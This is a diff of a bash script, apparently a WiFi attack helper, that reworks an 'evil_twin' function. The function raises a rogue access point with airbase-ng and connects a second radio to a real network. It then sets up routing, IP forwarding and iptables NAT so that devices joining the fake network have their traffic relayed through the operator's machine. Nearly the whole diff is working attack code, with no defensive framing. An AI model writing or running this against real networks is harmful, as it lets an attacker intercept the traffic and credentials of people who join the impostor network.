@@ -28,19 +28,24 @@ function print_help() {
 	echo "  -s    Specify the SSID for the WiFi network"
 }
 
+function connect_wifi() {
+	wpa_supplicant -B -i $RADIO_CLIENT -c <(wpa_passphrase $SSID $PASS)
+}
+
 function evil_twin() {
-	# For whatever reason this doesn't work if wlan1 is up.
-	modprobe rtw88_8723ds
+	ip link set $RADIO_AP down
+	iw dev $RADIO_AP set monitor none
 	airmon-ng start $RADIO_AP
-	modprobe rtw88_8723du
-	# Start wlan1 now
-	airbase-ng -e $AP_SSID -c 11 $RADIO_AP 2>&1 > $LOG_F &
+	airbase-ng -e $AP_SSID $RADIO_AP 2>&1 > $LOG_F &
+	while ! grep -q "Access Point with BSSID" $LOG_F; do
+		sleep 1
+	done
+	connect_wifi
 	ifconfig at0 up
 	ifconfig at0 192.168.1.1 netmask 255.255.255.0
 	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-	modprobe ip_tables
 	iptables -P FORWARD ACCEPT
-	iptables -t nat -A POSTROUTING -o $RADIO_AP -j MASQUERADE
+	iptables -t nat -A POSTROUTING -o $RADIO_CLIENT -j MASQUERADE
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 
 	# sed -i "/^interface=/c\interface=$RADIO_AP" /etc/dnsmasq.conf
@@ -67,7 +72,7 @@ function wifi() {
 			iw $RADIO_CLIENT scan | grep "SSID:"
 			;;
 		connect)
-			wpa_supplicant -B -i $RADIO_CLIENT -c <(wpa_passphrase $SSID $PASS)
+			connect_wifi
 			;;
 		*)
 			print_help
